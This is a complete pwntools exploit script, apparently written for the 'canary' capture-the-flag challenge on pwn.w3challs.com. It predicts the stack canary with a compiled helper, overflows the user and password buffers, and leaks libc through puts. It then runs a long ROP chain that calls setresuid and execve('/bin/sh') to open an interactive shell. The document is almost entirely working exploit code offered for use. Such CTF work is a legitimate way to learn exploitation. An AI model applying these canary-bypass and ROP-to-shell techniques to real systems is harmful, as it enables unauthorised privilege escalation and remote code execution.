#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canary
from pwn import *
import re
import sys

context.terminal = ['alacritty', '-e', 'sh', '-c']

libc = ELF('libc.so.6')
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global io1
    global io2
    global exe
    global rand
    global libc
    if args.GDB:
        exe = context.binary = ELF('canary')
        rand = ELF("./rand")
        io1 = gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        io2 = process([rand.path] + [str(io1.pid)])
    elif args.REMOTE:
        w3 = ssh(host='pwn.w3challs.com',
            user='canary',
            password='canary',
            port=10101)
            
        gcc_com = "gcc -o rand_utility -Wall -Wextra -ansi -pedantic -m32 -fno-stack-protector -Wl,-z,noexecstack ./rand.c"
        cmds1 = ["mkdir -p /tmp/testity3", "cd /tmp/testity3", "echo '" + c_code + "' > rand.c", gcc_com]
        sh = w3.shell('/bin/sh')
        sh.sendline("; ".join(cmds1))

        exe = context.binary = ELF('canary')
        io1 = w3.process(executable="/home/canary/canary", raw=False)
        sh.sendline("/tmp/testity3/rand_utility " + str(io1.pid))
        io2 = sh
    else:
        exe = context.binary = ELF('canary')
        rand = ELF("./rand")
        io1 = process([exe.path], *a, **kw)
        io2 = process([rand.path] + [str(io1.pid)])

gdbscript = '''
gef config context.nb_lines_stack 20
b *0x080489ff
b *0x8048a13
continue
'''.format(**locals())

c_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {

	int seed = atoi(argv[1]);
	int rand_off;
	int stackguard;

        if(argc != 2)
            return -1;

	srand(seed);

	stackguard = rand();
	rand_off = rand()%4;

	*((char*)&stackguard + (rand_off % 4)) = (char) 0 ;

	printf("Stackguard: %d END", stackguard);

	return 0;
}
'''




# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

#From password variable 
eip_offset_pass = 90
canary_offset_pass = 70
canary_offset_user = 39
colon_char = "3a"
addr_len = 4

start()

io2.recvuntil("Stackguard: ", True)
stackguard = io2.recvuntil(" END", True).decode("ascii")

stackguard2 = hex(int(stackguard))

if(len(stackguard2) == 8):
    stackguard = colon_char + stackguard2[2:len(stackguard2)]
    stackguard2 = ""

elif(len(stackguard2) == 10):
    for i in range(len(stackguard2)//2):

        if(stackguard2[i*2:i*2+2] == "00"):
            if(i*2+2 != len(stackguard2)):
                stackguard = colon_char + stackguard2[i*2+2:len(stackguard2)]
                stackguard2 = stackguard2[2:i*2]
            else:
                stackguard = colon_char
                stackguard2 = stackguard2[2:i*2]

else:
    print("Invalid len")
    sys.exit(0)

user_payload = int(stackguard, 16).to_bytes(len(stackguard)//2, "little")
if(stackguard2 != ""):
    padding = "11"
    stackguard2 = stackguard2 + padding*(addr_len - len(stackguard2)//2)
    pass_payload = int(stackguard2, 16).to_bytes(len(stackguard2)//2, "little")
else:
    pass_payload = b""

payload1 = dict()
payload2 = dict()
payload1[canary_offset_user] = user_payload
payload2[canary_offset_pass] = pass_payload

R = ROP(exe)

R.call(exe.sym.puts, [exe.sym.got.puts])
R.call(exe.sym.main)

payload2[eip_offset_pass] = R.chain()

payload1 = fit(payload1)
payload2 = fit(payload2)

#Viene fatta prima la strcpy della pass e dopo user
payload = payload1 + payload2

io1.sendline(payload)

puts_addr = io1.recvline(False)[0:4].ljust(4, b"\x00")
libc_puts = u32(puts_addr)
libc.address = libc_puts - libc.sym.puts
print(hex(libc.address))

R = ROP(libc, badchars="\x00")

sh_addr = next(libc.search(b"/bin/sh"))

#Local
#mov_edx_min_ret_off = 0x0007e749
#inc_edx_ret_off = 0x00086bdc
#pop_ebx_ret_off = 0x000220f6
#xor_ecx_mod_eax_ret_off = 0x001262c0
#mov_esi_edx_ret_off = 0x000a3a83
#call_execve_off = 0x000cbd31 #mov eax, 0xb; call dword ptr gs:[0x10];

#W3 libc
push_eax_ret_off = 0x0002ccab
mov_edx_min_ret_off = 0x00074a05
inc_edx_ret_off = 0x0002bbe3
pop_ebx_ret_off = 0x00018be5
mov_ecx_min_mod_eax_ret_off = 0x00098f6c
inc_ecx_ret_off = 0x0018de7d
mov_esi_edx_ret_off = 0x0009891f
call_execve_off = 0x000bf5bd #mov eax, 0xb; call dword ptr gs:[0x10];

syscall_ret_off = 0x000bfe45
syscall_off = 0x00002d37
xor_eax_ret_off = 0x0002e485
inc_eax_ret_off = 0x00008aac
add_eax_9_ret_off = 0x0015a920 #Da ripetere 114 volte
mov_edx_eax_mod_eax_ret_off = 0x0006d9ce #mov edx, eax; mov eax, edx; pop ebx; pop esi; ret;
mov_ebx_edx_ret_off = 0x000e65c2

call_setresuid_off = 0x000e4dc8 #mov eax, 0xd0; mov ebx, edx; call dword ptr gs:[0x10];

R.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

execve_payload = dict()

#Local
#execve_payload[0*addr_len] = libc.address + mov_edx_min_ret_off
#execve_payload[1*addr_len] = libc.address + inc_edx_ret_off
#execve_payload[2*addr_len] = libc.address + pop_ebx_ret_off
#execve_payload[3*addr_len] = sh_addr
#execve_payload[4*addr_len] = libc.address + xor_ecx_mod_eax_ret_off
#execve_payload[5*addr_len] = libc.address + mov_esi_edx_ret_off
#execve_payload[6*addr_len] = libc.address + call_execve_off

user_id = 1026

#W3
execve_payload[0*addr_len] = libc.address + mov_ecx_min_mod_eax_ret_off
execve_payload[1*addr_len] = libc.address + inc_ecx_ret_off
execve_payload[2*addr_len] = libc.address + xor_eax_ret_off
for i in range(3, 3+114): #RUID 0x402 == 1026 == canary_pwned
    execve_payload[i*addr_len] = libc.address + add_eax_9_ret_off

for i in range(117, 117 + user_id):
    execve_payload[i*addr_len] = libc.address + inc_ecx_ret_off

execve_payload[1143*addr_len] = libc.address + mov_edx_eax_mod_eax_ret_off
execve_payload[1144*addr_len] = b"aaaa" #Per pop ebx
execve_payload[1145*addr_len] = b"aaaa" #Per pop esi
#edx ed ecx inizializzati a 1026
execve_payload[1146*addr_len] = libc.address + xor_eax_ret_off
for i in range(1147, 1147 + 0xd0): #1355
    execve_payload[i*addr_len] = libc.address + inc_eax_ret_off
#eax settato
execve_payload[1355*addr_len] = libc.address + mov_ebx_edx_ret_off
execve_payload[1356*addr_len] = libc.address + syscall_ret_off
execve_payload[1357*addr_len] = libc.address + mov_edx_min_ret_off
execve_payload[1358*addr_len] = libc.address + inc_edx_ret_off
execve_payload[1359*addr_len] = libc.address + pop_ebx_ret_off
execve_payload[1360*addr_len] = sh_addr
execve_payload[1361*addr_len] = libc.address + mov_ecx_min_mod_eax_ret_off
execve_payload[1362*addr_len] = libc.address + inc_ecx_ret_off
execve_payload[1363*addr_len] = libc.address + mov_esi_edx_ret_off
execve_payload[1364*addr_len] = libc.address + call_execve_off

execve_payload = fit(execve_payload)

payload3 = dict()
payload3[canary_offset_pass] = pass_payload
payload3[eip_offset_pass] = execve_payload
payload3 = fit(payload3)

payload = payload1 + payload3

io1.sendline(payload)

io1.interactive()

